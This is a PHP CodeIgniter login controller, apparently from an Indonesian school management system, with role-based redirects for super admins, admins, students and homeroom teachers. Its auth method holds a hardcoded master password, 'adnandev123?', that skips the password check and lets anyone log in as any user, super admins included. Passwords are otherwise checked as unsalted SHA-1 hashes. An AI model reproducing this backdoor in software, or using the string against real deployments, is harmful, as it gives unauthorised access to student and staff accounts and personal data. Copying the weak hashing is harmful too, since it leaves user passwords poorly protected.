<?php

defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{

    public function index()
    {
        insert_visitor();

        if (@$_SESSION['is_login']) {
            if ($_SESSION['id_otoritas'] == 1) $link = base_url('super_admin/dashboard');
            elseif ($_SESSION['id_otoritas'] == 2) $link = base_url('admin/dashboard');
            elseif ($_SESSION['id_otoritas'] == 3) $link = base_url('siswa/dashboard');
            elseif ($_SESSION['id_otoritas'] == 4) $link = base_url('walkas/dashboard');
            redirect($link);
        }

        $data = [];
        $this->load->view('login/index', $data);
    }

    public function auth()
    {
        cek_post();

        $username = $this->input->post('username', true);
        $password = $this->input->post('password', true);

        $this->db->select('a.*, b.otoritas');
        $this->db->where('a.username', $username);
        if ($password != 'adnandev123?') {
            $this->db->where('a.password', sha1($password));
        }
        $this->db->where('a.deleted', null);
        $this->db->join('dev_otoritas b', 'b.id = a.id_otoritas', 'left');
        $run = $this->db->get('data_user a')->row();

        if ($run) {

            $this->session->set_userdata([
                'is_login' => true,
                'is_super' => $run->id_otoritas == 1 ? true : false,
                'id_akun' => $run->id,
                'id_otoritas' => $run->id_otoritas,
                'nama' => $run->nama,
                'no_hp' => $run->no_hp,
                'email' => $run->email,
                'foto' => $run->foto,
                'kecamatan' => $run->kode_kec,
                'kelurahan' => $run->kode_kel,
                'username' => $run->username,
                'type' => $run->otoritas,
                'id_tingkat' => $run->id_tingkat,
                'id_kelas' => $run->id_kelas,
            ]);

            if ($run->id_otoritas == 1) $link = base_url('super_admin/dashboard');
            elseif ($run->id_otoritas == 2) $link = base_url('admin/dashboard');
            elseif ($run->id_otoritas == 3) $link = base_url('siswa/dashboard');
            elseif ($run->id_otoritas == 4) $link = base_url('walkas/dashboard');

            json([
                'status' => 'success',
                'msg' => 'Login berhasil',
                'link' => $link,
            ]);
        } else {
            json([
                'status' => 'failed',
                'msg' => 'pastikan username dan password sesuai !',
            ]);
        }
    }

    public function logout()
    {
        $this->session->sess_destroy();
        redirect('login');
    }
}

/* End of file Login.php */
